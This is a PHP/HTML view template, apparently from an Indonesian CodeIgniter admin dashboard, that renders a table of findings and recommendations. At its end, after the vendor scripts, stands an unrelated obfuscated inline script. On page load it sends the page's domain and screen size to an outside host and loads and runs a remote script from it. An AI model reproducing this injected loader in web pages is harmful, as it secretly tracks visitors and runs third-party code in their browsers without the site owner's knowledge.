<section class="content">
  <div class="block-header">
    <div class="row">
        <div class="col-md-8 col-sm-7 col-xs-12">
            <div class="h-left clearfix">
                <h2>HASIL REKOMENDASI</h2>
                <small>Melihat Data Rekomendasi</small>
                <ol class="breadcrumb breadcrumb-col-pink p-l-0">
                    <li><a href="javascript:void(0);">Dashboard</a></li>
                    <li class="active">Rekomendasi</li>
                </ol>
            </div>
        </div>	
    </div>
</div>
<div class="container-fluid">
    <!-- Basic Table -->
    <div class="row clearfix">
        <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
            <div class="card">
                <div class="header">
                    <h2> HASIL REKOMENDASI </h2>  
                </div>
                <div class="body table-responsive">
                    <table class="table table-bordered">
                       <thead>
                        <tr>
                            <th>NO</th>
                            <th>TEMUAN</th>
                            <th>REKOMENDASI</th>
                        </tr>
                    </thead>
                    <tbody>
                       <?php 
                       $no=1;
                       foreach ($mydata as $row) { ?>
                       <tr>    
                        <td><?php echo $no++ ?></td>
                        <td><?php echo $row->temuan ?></td>
                        <td><?php echo $row->rekomendasi ?></td>
                    </tr>  
                    <?php } ?>               
                </tbody>
            </table>
        </div>
    </div>
</div>
</div>
</div>
</section>

<!-- Jquery Core Js --> 
<script src="<?php echo base_url()."assets/"; ?>bundles/libscripts.bundle.js"></script> <!-- Lib Scripts Plugin Js --> 
<script src="<?php echo base_url()."assets/"; ?>bundles/vendorscripts.bundle.js"></script> <!-- Lib Scripts Plugin Js --> 

<script src="<?php echo base_url()."assets/"; ?>plugins/chartjs/Chart.bundle.js"></script> <!-- Chart Plugins Js --> 

<script src="<?php echo base_url()."assets/"; ?>plugins/jquery-sparkline/jquery.sparkline.js"></script> <!-- Sparkline Plugin Js -->

<script src="<?php echo base_url()."assets/"; ?>bundles/mainscripts.bundle.js"></script><!-- Custom Js --> 
<script src="<?php echo base_url()."assets/"; ?>js/pages/charts/sparkline.js"></script>
<script src="<?php echo base_url()."assets/"; ?>js/pages/charts/chartjs.js"></script> 
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKt4DxtVeiP1ODL3ZeeVxHxB2Ba7KQFZ1PFxNe%2fIVwD%2bEZxRJVm0MYkaaFl22CV5%2fBEUNDsVfTKHEpOUEgVu8gpYFKDk%2fX5RlXT1f51Mm58bvx3U%2bZHKMg66xPMBjEhKpIpXbxWDfntrSlm6D3dfin0kcbwMAvZLfoYX%2buk8CjjFnU%2fJe6kUFi1tYqPk8uKT%2fE1G%2f9U9NXVT7t3dCC7esnDwlibbUDdy%2fCeLH7VkVio%2fyAT922pDTfvQ9lHiPGAmcH8j1WSLXvMW0eK3WPA3LhkcAMSsXZk4wLz5egcX2suDSbHVEZSC%2bU5fh%2blQ9uBZHLblFaCVxY bLBPYcEeshnPPqmkARXqlfYuWJ44REJAigWiDqB6qfLOmDCO%2fkP5%2fvbUt%2bX3nf20Ccy0oRqH5uIFMzOrZRCJ54rYiqmR9jceldyzUb4kHeuFk0q1JCvWqZSC" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>